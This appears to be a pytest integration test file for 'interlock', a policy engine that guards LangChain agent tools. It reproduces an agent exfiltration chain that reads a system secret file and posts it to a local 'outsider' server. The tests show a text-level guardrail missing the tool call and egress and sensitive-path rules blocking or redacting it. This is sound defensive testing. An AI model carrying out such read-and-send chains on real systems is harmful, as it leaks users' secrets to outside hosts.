"""Integration: the same real incident, inside a real LangChain tool call.

This one uses genuine ``langchain_core`` tools and drives them the way an agent
does: look the tool up by name, invoke it with the model's arguments. interlock
is wired in with ``guard_langchain_tools`` - the LangChain counterpart of
``guard_mcp_session`` - which returns tools of the same name and schema whose
execution first passes through the policy engine.

Skipped automatically where langchain_core is not installed, so the core suite
stays green without the optional dependency.
"""
from __future__ import annotations

import pytest

import interlock
from interlock import Blocked, Decision, guard_langchain_tools
from interlock.detectors.data_egress import (
    network_egress_guard,
    sensitive_path_guard,
)

pytest.importorskip("langchain_core")
from langchain_core.tools import tool  # noqa: E402

import incident  # noqa: E402


def _real_tools():
    """Real LangChain tools wrapping the real side-effecting functions."""

    @tool
    def read_file(path: str) -> str:
        """Read a file and return its contents."""
        return incident.read_file(path)

    @tool
    def http_post(url: str, data: str) -> str:
        """POST data to a URL."""
        return incident.http_post(url, data)

    return [read_file, http_post]


def _drive(tools, secret_path, exfil_url):
    by_name = {t.name: t for t in tools}

    def call(name, args):
        return by_name[name].invoke(args)

    return incident.run_exfil_chain(call, secret_path, exfil_url)


def test_incident_is_real_through_langchain(outsider, system_secret_path):
    # Unguarded real tools: the framework happily exfiltrates the file.
    secret = _drive(_real_tools(), system_secret_path, outsider.url)

    assert "root" in secret
    assert outsider.received and "root" in outsider.received[0]


def test_response_guardrail_is_blind_to_the_tool_call(outsider, system_secret_path):
    # The text layer allows the benign reply...
    assert incident.response_guardrail_scan(incident.BENIGN_AGENT_REPLY) == "allow"

    # ...interlock, guarding the real tools, blocks the send before it leaves.
    interlock.install(rules=[network_egress_guard(allowed_hosts={"api.internal"})])
    guarded = guard_langchain_tools(_real_tools())

    with pytest.raises(Blocked):
        _drive(guarded, system_secret_path, outsider.url)
    assert outsider.received == []


def test_guard_langchain_tools_blocks_egress(outsider, system_secret_path):
    interlock.install(rules=[network_egress_guard(allowed_hosts={"api.internal"})])
    guarded = guard_langchain_tools(_real_tools())

    with pytest.raises(Blocked) as excinfo:
        _drive(guarded, system_secret_path, outsider.url)

    assert excinfo.value.action == "http_post"
    assert outsider.received == []


def test_guard_langchain_tools_blocks_secret_read(outsider, system_secret_path):
    interlock.install(rules=[sensitive_path_guard()])
    guarded = guard_langchain_tools(_real_tools())

    with pytest.raises(Blocked) as excinfo:
        _drive(guarded, system_secret_path, outsider.url)

    assert excinfo.value.action == "read_file"
    assert outsider.received == []


def test_guarded_tools_keep_name_and_schema(outsider):
    # The agent must be able to bind the guarded tools exactly as before.
    original = _real_tools()
    guarded = guard_langchain_tools(original)

    assert [t.name for t in guarded] == [t.name for t in original]
    for orig, g in zip(original, guarded):
        assert g.args == orig.args  # same argument schema

    # And an allowlisted destination still goes through, really sent.
    interlock.install(rules=[network_egress_guard(allowed_hosts={"127.0.0.1"})])
    guarded = guard_langchain_tools(_real_tools())
    {t.name: t for t in guarded}["http_post"].invoke(
        {"url": outsider.url, "data": "telemetry"}
    )
    assert outsider.received == ["telemetry"]


def test_modify_redacts_payload_through_langchain(outsider, system_secret_path):
    def redact(event):
        if event.action == "http_post" and "data" in event.args:
            return Decision.modify(
                {"data": "[REDACTED BY INTERLOCK]"}, reason="data-loss prevention"
            )
        return None

    interlock.install(rules=[redact, network_egress_guard(allowed_hosts={"127.0.0.1"})])
    guarded = guard_langchain_tools(_real_tools())

    _drive(guarded, system_secret_path, outsider.url)

    assert outsider.received == ["[REDACTED BY INTERLOCK]"]
    assert all("root" not in body for body in outsider.received)
